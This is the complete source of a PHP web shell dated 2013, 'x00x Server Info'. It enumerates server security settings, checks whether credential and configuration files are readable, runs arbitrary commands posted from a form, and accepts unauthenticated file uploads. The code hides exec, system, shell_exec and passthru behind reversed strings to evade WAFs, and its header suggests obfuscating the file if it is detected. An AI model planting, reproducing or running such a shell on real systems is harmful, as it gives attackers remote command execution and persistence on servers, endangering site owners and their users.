<?php
/*
x00x Server info

This File Was Writed By DamaneDz.
all The Copyright Are To Me And x00x Projects
For Educational Purpose Only
Use This Script For Your Own Risques
Twitter:@DamaneDz
P.S: If The Tool Won't Work Good Try To Crypt IT (USE a PHP Obfuscator)
The Last Update:27/04/2013

Change Log:
-----------
16/03/2013:
1-Add The Current Dir Option 
2-Coloring Some Results
-----------
20/04/2013:
1-Check if Some functions exists and not blacklisted (passthru-exec-system-shell_exec-symlink-eval-...)
2-To ByPass Some WAF I Used strrev for each of these functions: passthru-exec-system-shell_exec
3-Add Safe_mode_exec_dir and Safe_mode_include_dir
-----------
25/04/2013:
1-Advanced Options Category Added
2-Run Command Option Added to The Advanced Options Category
-----------
27/04/2013:
1-Uploading File Option Added to The Advanced Options Category

*/

function nepop(){
return "\x70\x6F\x70\x65\x6E";
}

function excute($cmd) {

$exe=strrev("cexe");
$she_exec=strrev("cexe_llehs");
$syst=strrev("metsys");
$passt=strrev("urhtssap");

$rez = "";
if(@function_exists($exe)){
$exe($cmd,$rez);
$rez = join("\n",$rez);
}elseif(@function_exists($she_exec)){
$rez = $she_exec($cmd);
}elseif(@function_exists($syst)){
$rez = $syst($cmd);
}elseif(@function_exists($passt)){
$rez = $passt($cmd);
}elseif(@is_resource($f = @nepop($cmd,"r"))) {
$rez = "";
while(!@feof($f)){$rez.= @fread($f,1024);}
@pclose($f);
}else{
$rez = "Excute Functions On Your System Are Disabled !\nLook at Disabled Functions";
}
return $rez;
}

function func_enable($func){
if(function_exists($func))
{return "<b><font color=green>Enabled</b></font>";}else
{return "<b><font color=red>Disabled</b></font>";}
}
function showstat($stat) {
    if ($stat=="on") { return "<font color=green><b>ON</b></font>"; }
    else { return "<font color=red><b>OFF</b></font>"; }
}
function named_conf(){
  if(@is_readable('/etc/named.conf')){ return "<font color=green><b>Readable</b></font>";
  }else { return "<font color=red><b>Not Readable</b></font>"; }
}
function passwd(){
  if(@is_readable('/etc/passwd')){ return "<font color=green><b>Readable</b></font>";
  }else { return "<font color=red><b>Not Readable</b></font>"; }
}
function testoracle() {
  if (@function_exists('ocilogon')) { return showstat("on"); }
  else { return showstat("off"); }
}
function testpostgresql() {
    if (@function_exists('pg_connect')) { return showstat("on"); }
    else { return showstat("off"); }
}
function testmssql() {
    if (@function_exists('mssql_connect')) { return showstat("on"); }
    else { return showstat("off"); }
}
function testmysql() {
    if (@function_exists('mysql_connect')) { return showstat("on"); }
    else { return showstat("off"); }
}

function showdisablefunctions() {
    if ($disablefunc=@ini_get("disable_functions")){ return "<font color=red><b>".$disablefunc."</b></font>"; }
    else { return "<font color=green><b>NONE</b></b></font>"; }
}
function openbase_dir() {
    if ($openbase_dir=@ini_get('open_basedir')){ return "<font color=red><b>".$openbase_dir."</b></font>"; }
    else { return "<font color=green><b>NONE</b></b></font>"; }
}
function safe_mode_exec_dir() {
    if ($safe_mode_exec_dir=@ini_get('safe_mode_exec_dir')){ return "<font color=red><b>".$safe_mode_exec_dir."</b></font>"; }
    else { return "<font color=green><b>NONE</b></b></font>"; }
}
function magic_quotes_gpc() {
if ($safe_mode_exec_dir=@ini_get('magic_quotes_gpc')){ return "<font color=red><b>ON</b></font>"; }
else { return "<font color=green><b>OFF</b></b></font>"; }
}
function safe_mode_include_dir() {
    if ($safe_mode_include_dir=@ini_get('safe_mode_include_dir')){ return "<font color=red><b>".$safe_mode_include_dir."</b></font>"; }
    else { return "<font color=green><b>NONE</b></b></font>"; }
}
function testfetch() {
    if(excute('fetch --help')) { return showstat("on"); }
    else { return showstat("off"); }
}
function testwget() {
    if (excute('wget --help')) { return showstat("on"); }
    else { return showstat("off"); }
}
function testperl() {
    if (excute('perl --help')) { return showstat("on"); }
    else { return showstat("off"); }
}
function testpy() {
    if (excute('python --help')) { return showstat("on"); }
    else { return showstat("off"); }
}
function testsh() {
    if (excute('bash --help')) { return showstat("on"); }
    else { return showstat("off"); }
}
function testcurl() {
    if (@function_exists('curl_version')) { return showstat("on"); }
    else { return showstat("off"); }
}
if (@ini_get("safe_mode") or strtolower(@ini_get("safe_mode")) == "on") {
    $safemode = "<font color=red><b>ON (Secure)</b></font>";
  }else{
    $safemode = "<font color=green><b>OFF (Not Secure)</b></font>";
}

$pwd=str_replace('\\', '/', dirname(__FILE__)).'/';

echo "
<html><head><title>x00x Server Info ~ ".$_SERVER['HTTP_HOST']." ~</title></head>
<style>
body{background-color:#111;font-family:verdana;}
.info{background-color:#fff;}
input,textarea{border:1px solid #000;} 
</style>
<div class=info>
<table bgcolor=#ff0000 width=100%px height=20px><tr>
<td><font color=#fff size=1px><center>x00x Server Info[Coded By: DamaneDz]</center></font></td>
</tr></table>
<font color=#000 size=2px>
<center><span><font color='#111'>
<br><table bgcolor=#ff0000 width=18%px height=20px><tr>
<td><font color=#fff size=1px><center>The System & Software:</center></font></td>
</tr></table>
<br> System: <font color=blue>".@php_uname()." </font>|</br>
<br> Server Software : <font color=blue>".@getenv("SERVER_SOFTWARE")." </font>|PHP Version: <font color=blue>".@phpversion()." </font>| </br>
<br> Current Dir: <font color=blue>{$pwd} </font>|</br>
<br> ID:<font color=blue>" .@getmyuid()."(".@get_current_user().") </font>- UID:<font color=blue>".@getmyuid()."(".@get_current_user().") </font>- GID:<font color=blue>".@getmygid()."(".@get_current_user().") </font>|</br>
<br> Hostname: <font color=blue>".$_SERVER['HTTP_HOST']."</font> |</br>
<br> Your IP:<font color=blue>".$_SERVER["REMOTE_ADDR"]." </font>| The Server IP:<font color=blue>".@gethostbyname($_SERVER["HTTP_HOST"])." </font>|</br>
<br><table bgcolor=#ff0000 width=18%px height=20px><tr>
<td><font color=#fff size=1px><center>Security System & Programs:</center></font></td>
</tr></table>
<br> Safe Mode: {$safemode} | Open_BaseDir: ".openbase_dir()."|<br> Safe_mode_exec_dir: ".safe_mode_exec_dir()."| Safe_mode_include_dir: ".safe_mode_include_dir()."| Magic_Quotes_Gpc: ".magic_quotes_gpc()."|</br>
<br> Used Functions: <font color=blue>eval: </font>".@func_enable(strrev("lave"))."|<font color=blue>Popen: </font>".@func_enable(strrev("nepop"))."|<font color=blue>Passthru: </font>".@func_enable(strrev("urhtssap"))."|<font color=blue>Exec: </font>".@func_enable(strrev("cexe"))."|<font color=blue>System: </font>".@func_enable(strrev("metsys"))."|<font color=blue>Shell_exec: </font>".@func_enable(strrev("cexe_llehs"))."|<br><font color=blue>Symlink: </font>".@func_enable(strrev("knilmys"))."|<font color=blue>Show_Source: </font>".@func_enable(strrev("ecruos_wohs"))."|<font color=blue>Read File: </font>".@func_enable(strrev("elifdaer"))."|<font color=blue>Highlight File: </font>".@func_enable(strrev("elif_thgilhgih"))."|<font color=blue>Chmod: </font>".@func_enable(strrev("domhc"))."|<font color=blue>Posix_getpwuid: </font>".@func_enable(strrev("diuwpteg_xisop"))."|</br>
<br> Disabled Functions: ".@showdisablefunctions()."|</br>
<br> named.conf File is: ".named_conf()." | passwd File is: ".passwd()."|</br>
<br>
MySQL: ".@testmysql()."|
MSSQL: ".@testmssql()."|
Oracle: ".@testoracle()."|
PostgreSQL: ".@testpostgresql()."|
cURL: ".@testcurl()."|
Fetch: ".@testfetch()."|
WGet: ".@testwget()."|
Perl: ".@testperl()."|
Python: ".@testpy()."|
Bash: ".@testsh()."|
<br>
<br><table bgcolor=#ff0000 width=18%px height=20px><tr>
<td><font color=#fff size=1px><center>Advanced Options:</center></font></td>
</tr></table>
<br>
<form method='POST' enctype='multipart/form-data'>
<textarea method='POST'  rows=20 cols=100 wrap=off>";
if($_POST["run"]){
$cmd=$_POST["command"];
if($cmd=="about"){
echo get_current_user()." #~ $cmd\nx00x Server Info was Writed By DamaneDz\n\nMy Blog:http://www.damanedz.com/blog/\nFaceBook:http://fb.me/DamaneDz
Twitter:@DamaneDz\nEmail:Damane-Dz@hotmail.com\nSkype:Damane2011\n\n&copy x00x Dz_2013";
}elseif($cmd==""){echo "Can't execute a blank command !!";}else{
$rez=excute($cmd);if($rez){echo get_current_user()." #~ $cmd\n".$rez;}else{echo get_current_user()." #~ $cmd\nCan't Excute This Command";}}}
echo"</textarea>
<br>
Run Command:<input type='text' name='command'/>
<input type='submit' name='run' value='Run'/>
<br><br>Upload a File:
<input type='file' name='file' size='50'/>
<input name='Upload' type='submit' value='Upload'/>";
if( $_POST['Upload']){
if(function_exists(copy)){
$up="copy";
}elseif(function_exists(move_uploaded_file)){
$up="move_uploaded_file";
}else{
echo "<br><center><font color='green'>You Can't Upload a File because of The Server or PHP Security !!</font><br></center>";
}
if($up($_FILES['file']['tmp_name'], $_FILES['file']['name'])){
echo "<br><center><b><font color='green'>{$_FILES['file']['name']} --> Uploaded With Success !!!</font><br></b></center>";
}else{
echo "<br><center><b><font color='green'>Error in Uploading </font><br></b></center>";
}
}
echo"</form>
</center>
</font>
<br/>
</div>
<p align='center'><font color='#FF00FF'>By DamaneDz &copy x00x_Team 2013<br/></font></p>
<br/>
";
?>
